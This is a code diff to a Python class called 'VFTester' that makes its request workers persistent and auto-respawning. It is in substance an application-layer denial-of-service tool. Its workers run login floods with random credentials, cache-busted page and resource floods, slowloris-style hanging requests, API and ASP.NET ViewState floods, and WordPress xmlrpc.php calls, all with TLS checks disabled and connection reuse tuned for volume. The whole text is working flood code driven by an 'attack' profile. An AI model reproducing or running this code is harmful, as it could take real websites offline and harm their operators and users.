@@ -979,126 +979,312 @@ class VFTester:
         elif r.mode == "viewstate": self.stats.viewstate_hits += 1
         elif r.mode == "wp": self.stats.wp_hits += 1
 
+    async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
+        """Persistent worker wrapper — respawns inner workers when they die"""
+        if delay > 0: await asyncio.sleep(delay)
+        while not self._stop.is_set():
+            try:
+                # Pick a random worker type and run it once (single cycle)
+                # Instead of infinite loop, each worker type does one request
+                r = random.random()
+                is_spa = self.attack.get("spa_config", {}).get("enabled", False)
+                
+                if is_spa:
+                    weights = self.attack.get("spa_config", {}).get("worker_weights", {})
+                    login_pct = weights.get("login_pct", 0.05)
+                    page_pct = 0
+                    resource_pct = weights.get("resource_pct", 0.05)
+                    slowloris_pct = weights.get("slowloris_pct", 0.05)
+                    api_pct = weights.get("api_pct", 0.40)
+                    graphql_pct = weights.get("graphql_pct", 0.20)
+                    spa_route_pct = weights.get("spa_route_pct", 0.15)
+                    ssr_render_pct = weights.get("ssr_render_pct", 0.10)
+                    viewstate_pct = 0
+                    wp_pct = 0
+                else:
+                    login_pct = 0.40
+                    page_pct = 0.20
+                    resource_pct = 0.15
+                    slowloris_pct = 0.05
+                    api_pct = 0.05 if self.has_api else 0
+                    graphql_pct = 0
+                    spa_route_pct = 0
+                    ssr_render_pct = 0
+                    viewstate_pct = 0.10 if self.is_aspnet else 0
+                    wp_pct = 0.10 if self.is_wordpress else 0
+
+                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct
+                if total == 0: total = 1
+                login_pct /= total; page_pct /= total; resource_pct /= total
+                slowloris_pct /= total; api_pct /= total; graphql_pct /= total
+                spa_route_pct /= total; ssr_render_pct /= total
+                viewstate_pct /= total; wp_pct /= total
+
+                cumulative = 0
+                chosen = "page"
+
+                cumulative += api_pct
+                if r < cumulative: chosen = "api"
+                else:
+                    cumulative += graphql_pct
+                    if r < cumulative: chosen = "graphql"
+                    else:
+                        cumulative += spa_route_pct
+                        if r < cumulative: chosen = "spa_route"
+                        else:
+                            cumulative += ssr_render_pct
+                            if r < cumulative: chosen = "ssr_render"
+                            else:
+                                cumulative += login_pct
+                                if r < cumulative: chosen = "login"
+                                else:
+                                    cumulative += page_pct
+                                    if r < cumulative: chosen = "page"
+                                    else:
+                                        cumulative += resource_pct
+                                        if r < cumulative: chosen = "resource"
+                                        else:
+                                            cumulative += slowloris_pct
+                                            if r < cumulative: chosen = "slowloris"
+                                            else:
+                                                cumulative += viewstate_pct
+                                                if r < cumulative: chosen = "viewstate"
+                                                else:
+                                                    cumulative += wp_pct
+                                                    if r < cumulative: chosen = "wp"
+
+                # Execute a single request cycle
+                if chosen == "login":
+                    await self._single_login(session)
+                elif chosen == "page":
+                    await self._single_page(session, pages)
+                elif chosen == "resource":
+                    if resources:
+                        await self._single_resource(session, resources)
+                    else:
+                        await self._single_page(session, pages)
+                elif chosen == "slowloris":
+                    await self._single_slowloris(session)
+                elif chosen == "api":
+                    endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
+                    if endpoints:
+                        await self._single_api(session, endpoints)
+                    else:
+                        await self._single_page(session, pages)
+                elif chosen == "viewstate":
+                    await self._single_viewstate(session)
+                elif chosen == "wp":
+                    wp_config = self.attack.get("wordpress_config", {})
+                    await self._single_wp(session, wp_config)
+                else:
+                    await self._single_page(session, pages)
+
+                # Small delay between requests
+                if not self._stop.is_set():
+                    await asyncio.sleep(self.request_delay_ms / 1000)
+
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                # Worker crashed — log and respawn after short delay
+                if not self._stop.is_set():
+                    await asyncio.sleep(0.1)
+
+    async def _single_login(self, session):
+        """Single login attempt"""
+        t = time.time()
+        try:
+            hidden_fields = await self._refresh_viewstate(session) if self.is_aspnet else {}
+            form_data = {**hidden_fields,
+                        self.username_field: rand_user(),
+                        self.password_field: rand_pass()}
+            headers = {**self._base_headers(),
+                      "Content-Type": "application/x-www-form-urlencoded",
+                      "Origin": self.site_root, "Referer": self.url}
+            async with session.post(self.url, headers=headers, data=form_data,
+                                   ssl=False, allow_redirects=False) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                if "invalid" in body.lower():
+                    self._invalid_count += 1
+                    self._viewstate_ts = 0
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="login", hint=f"Login {resp.status}", url=self.url)
+                await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
+            await self.live_log.add("login", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            msg = type(e).__name__
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
+            await self.live_log.add("login", None, result.rt, msg, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_page(self, session, pages):
+        """Single page request"""
+        if not pages: pages = [self.url]
+        url = random.choice(pages)
+        t = time.time()
+        try:
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+            async with session.get(busted, headers=self._base_headers(),
+                                   ssl=False, allow_redirects=True) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
+                await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
+            await self.live_log.add("page", None, result.rt, "Timeout", url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=type(e).__name__, url=url)
+            await self.live_log.add("page", None, result.rt, type(e).__name__, url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_resource(self, session, resources):
+        """Single resource request"""
+        url = random.choice(resources)
+        t = time.time()
+        try:
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+            headers = {"User-Agent": random_ua(), "Accept": "*/*", "Connection": "keep-alive"}
+            async with session.get(busted, headers=headers, ssl=False) as resp:
+                data = await resp.read()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
+                await self.live_log.add("resource", resp.status, elapsed, None, url, result.hint)
+                self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=type(e).__name__, url=url)
+            await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_slowloris(self, session):
+        """Single slowloris request"""
+        t = time.time()
+        try:
+            headers = self._base_headers()
+            headers["Content-Length"] = str(random.randint(10000, 100000))
+            async with session.get(self.url, headers=headers, ssl=False,
+                                   timeout=aiohttp.ClientTimeout(total=30),
+                                   allow_redirects=False) as resp:
+                await asyncio.sleep(random.uniform(2, 8))
+                elapsed = time.time() - t
+                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
+                                  hint=f"Slow {elapsed:.1f}s", url=self.url)
+                await self.live_log.add("slowloris", resp.status, elapsed, None, self.url, result.hint)
+        except asyncio.TimeoutError:
+            elapsed = time.time() - t
+            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
+                              hint=f"Slow timeout {elapsed:.1f}s", url=self.url)
+            await self.live_log.add("slowloris", None, elapsed, None, self.url, "timeout")
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
+            await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
+        self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_api(self, session, endpoints):
+        """Single API request"""
+        endpoint = random.choice(endpoints)
+        url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
+        t = time.time()
+        try:
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+            headers = {**self._base_headers(), "Accept": "application/json"}
+            if random.random() > 0.6:
+                payload = json.dumps({"data": rand_user(), "id": random.randint(1, 99999)})
+                headers["Content-Type"] = "application/json"
+                async with session.post(busted, headers=headers, data=payload,
+                                       ssl=False, allow_redirects=False) as resp:
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="api", hint=f"API POST {resp.status}", url=url)
+                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
+            else:
+                async with session.get(busted, headers=headers,
+                                       ssl=False, allow_redirects=True) as resp:
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="api", hint=f"API GET {resp.status}", url=url)
+                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api", err=type(e).__name__, url=url)
+            await self.live_log.add("api", None, result.rt, type(e).__name__, url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_viewstate(self, session):
+        """Single ViewState flood request"""
+        t = time.time()
+        try:
+            hidden_fields = await self._refresh_viewstate(session)
+            form_data = dict(hidden_fields)
+            vs_size = len(json.dumps(form_data))
+            headers = {**self._base_headers(),
+                      "Content-Type": "application/x-www-form-urlencoded",
+                      "Origin": self.site_root, "Referer": self.url}
+            async with session.post(self.url, headers=headers, data=form_data,
+                                   ssl=False, allow_redirects=False) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                if "invalid" in body.lower():
+                    self._invalid_count += 1
+                    self._viewstate_ts = 0
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
+                await self.live_log.add("viewstate", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err="Timeout")
+            await self.live_log.add("viewstate", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err=type(e).__name__)
+            await self.live_log.add("viewstate", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_wp(self, session, wp_config):
+        """Single WordPress request"""
+        t = time.time()
+        try:
+            wp_url = f"{self.site_root}/xmlrpc.php"
+            payload = f'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+            headers = {**self._base_headers(),
+                      "Content-Type": "text/xml",
+                      "Origin": self.site_root, "Referer": self.url}
+            async with session.post(wp_url, headers=headers, data=payload,
+                                   ssl=False, allow_redirects=False) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="wp", hint=f"WP {resp.status}", url=wp_url)
+                await self.live_log.add("wp", resp.status, elapsed, None, wp_url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err="Timeout")
+            await self.live_log.add("wp", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err=type(e).__name__)
+            await self.live_log.add("wp", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
     def _spawn_worker(self, session, all_tasks, vectors, pages, resources, delay=0):
-        """Spawn a worker based on the attack profile vectors"""
-        if not vectors:
-            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
-            all_tasks.append(t)
-            return
-
-        # Check if SPA strategy — use SPA-optimized weights
-        spa_config = self.attack.get("spa_config", {})
-        if spa_config.get("enabled"):
-            weights = spa_config.get("worker_weights", {})
-            login_pct = weights.get("login_pct", 0.05)
-            page_pct = 0       # SPAs: page flood is useless
-            resource_pct = weights.get("resource_pct", 0.05)
-            slowloris_pct = weights.get("slowloris_pct", 0.05)
-            api_pct = weights.get("api_pct", 0.40)
-            graphql_pct = weights.get("graphql_pct", 0.20)
-            spa_route_pct = weights.get("spa_route_pct", 0.15)
-            ssr_render_pct = weights.get("ssr_render_pct", 0.10)
-            viewstate_pct = 0
-            wp_pct = 0
-        else:
-            # Default weight distribution for traditional sites
-            login_pct = 0.40
-            page_pct = 0.20
-            resource_pct = 0.15
-            slowloris_pct = 0.05
-            api_pct = 0.05 if self.has_api else 0
-            graphql_pct = 0
-            spa_route_pct = 0
-            ssr_render_pct = 0
-            viewstate_pct = 0.10 if self.is_aspnet else 0
-            wp_pct = 0.10 if self.is_wordpress else 0
-
-        # Normalize
-        total = (login_pct + page_pct + resource_pct + slowloris_pct +
-                 api_pct + graphql_pct + spa_route_pct + ssr_render_pct +
-                 viewstate_pct + wp_pct)
-        if total == 0: total = 1
-        login_pct /= total
-        page_pct /= total
-        resource_pct /= total
-        slowloris_pct /= total
-        api_pct /= total
-        graphql_pct /= total
-        spa_route_pct /= total
-        ssr_render_pct /= total
-        viewstate_pct /= total
-        wp_pct /= total
-
-        r = random.random()
-        cumulative = 0
-
-        # API Flood (PRIMARY for SPA)
-        cumulative += api_pct
-        if r < cumulative:
-            endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
-            t = asyncio.create_task(self._worker_api(session, endpoints, delay=delay))
-            all_tasks.append(t); return
-
-        # GraphQL Flood
-        cumulative += graphql_pct
-        if r < cumulative:
-            graphql_ep = spa_config.get("graphql_endpoint") or f"{self.site_root}/graphql"
-            t = asyncio.create_task(self._worker_graphql(session, graphql_ep, delay=delay))
-            all_tasks.append(t); return
-
-        # SPA Route Flood
-        cumulative += spa_route_pct
-        if r < cumulative:
-            routes = spa_config.get("spa_routes", pages)
-            t = asyncio.create_task(self._worker_spa_route(session, routes, delay=delay))
-            all_tasks.append(t); return
-
-        # SSR Render Flood (Next.js)
-        cumulative += ssr_render_pct
-        if r < cumulative:
-            next_routes = spa_config.get("next_data_routes", pages)
-            t = asyncio.create_task(self._worker_ssr_render(session, next_routes, delay=delay))
-            all_tasks.append(t); return
-
-        # Login Flood
-        cumulative += login_pct
-        if r < cumulative:
-            t = asyncio.create_task(self._worker_login(session, delay=delay))
-            all_tasks.append(t); return
-
-        # Page Flood
-        cumulative += page_pct
-        if r < cumulative:
-            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
-            all_tasks.append(t); return
-
-        # Resource Flood
-        cumulative += resource_pct
-        if r < cumulative:
-            t = asyncio.create_task(self._worker_resource(session, resources, delay=delay))
-            all_tasks.append(t); return
-
-        # Slowloris
-        cumulative += slowloris_pct
-        if r < cumulative:
-            t = asyncio.create_task(self._worker_slowloris(session, delay=delay))
-            all_tasks.append(t); return
-
-        # ViewState
-        cumulative += viewstate_pct
-        if r < cumulative:
-            t = asyncio.create_task(self._worker_viewstate(session, delay=delay))
-            all_tasks.append(t); return
-
-        # WordPress
-        cumulative += wp_pct
-        if r < cumulative:
-            wp_config = self.attack.get("wordpress_config", {})
-            t = asyncio.create_task(self._worker_wp(session, wp_config, delay=delay))
-            all_tasks.append(t); return
-
-        # Default to page
-        t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
+        """Spawn a persistent worker that auto-respawns on failure"""
+        t = asyncio.create_task(self._persistent_worker(session, vectors, pages, resources, delay=delay))
         all_tasks.append(t)
 
     def _render_dashboard(self, cur, max_w, step, mode, health, trend,
@@ -1200,7 +1386,7 @@ class VFTester:
 
         connector = aiohttp.TCPConnector(
             limit=actual_max * 2 + 1000,
-            force_close=True,
+            force_close=False,
             enable_cleanup_closed=True,
             ttl_dns_cache=30,
             keepalive_timeout=30,
